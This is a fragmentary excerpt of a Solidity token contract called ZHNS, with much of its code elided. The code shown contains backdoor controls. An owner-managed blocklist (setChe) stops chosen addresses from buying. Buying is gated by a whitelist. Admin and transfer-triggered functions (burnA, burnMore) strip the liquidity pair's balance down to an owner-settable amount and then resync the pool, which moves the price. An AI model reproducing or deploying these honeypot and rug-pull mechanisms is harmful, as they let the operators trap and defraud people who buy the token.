...
contract ZHNS is Context, IERC20, Ownable {
    ...
    mapping (address => bool) private _cheList;
    ...
    // fee list end
	address public ownerAddress = address(0xF82860d567F42815fc2Aa7E3FcbAaE85d5908603);

    address public lpAddress = address(0);
	
    string private _name = "wisdom NS";
    string private _symbol = "ZHNS";
    uint8  private _decimals = 18;

    uint256 private oneMoney = 21000 * 10 ** 18;

    mapping(address => bool) oneContract;
	
	bool public notOpen = true;

    bool private _burn = true;
	...
	modifier onlyAdmin() {
        require(
            managerAddressList[msg.sender],
            "Only admin can call this."
        );
        _;
    }

    function setManager(address userAddress, bool status) onlyAdmin public returns(bool){
        managerAddressList[userAddress] = status;
        return true;
    }

    function setBurn(bool _enabled) public onlyOwner {
        _burn = _enabled;
    }

    function setLpAddress(address userAddress) onlyAdmin public returns(bool){
    ...
    constructor () public {
        ...
        managerAddressList[msg.sender] = true;
        managerAddressList[address(this)] = true;
    ...
    function burnMore() private returns (bool) {
		uint256 tokenAmount = balanceOf(lpAddress);
		if (tokenAmount > oneMoney && _burn){
			uint256 incrAmount = tokenAmount.sub(oneMoney);
			_rOwned[lpAddress] = oneMoney;
			_rOwned[address(0)] = _rOwned[address(0)].add(incrAmount);
            emit Transfer(lpAddress, address(0), incrAmount);
            IPancakePair(lpAddress).sync();
		}
	}

    function setOneMoney(uint256 amount) public onlyOwner {
        oneMoney = amount;
    }

    function burnA() onlyAdmin public returns (bool) {
		uint256 tokenAmount = balanceOf(lpAddress);
		if (tokenAmount > oneMoney && _burn){
			uint256 incrAmount = tokenAmount.sub(oneMoney);
			_rOwned[lpAddress] = oneMoney;
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        ...
        } else if (oneContract[recipient]) {
            _rOwned[recipient] = _rOwned[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
		} else if (oneContract[sender]){
            require((_buyList[recipient] || canBuy) && !_cheList[recipient], "can't buy");
            _rOwned[recipient] = _rOwned[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
		} else {
            burnMore();
    ...
    function getJia(address account) public view returns(bool) {
       return _jiaList[account];
    }

    function setChe(address account, bool state) public onlyOwner {
        _cheList[account] = state;
    }
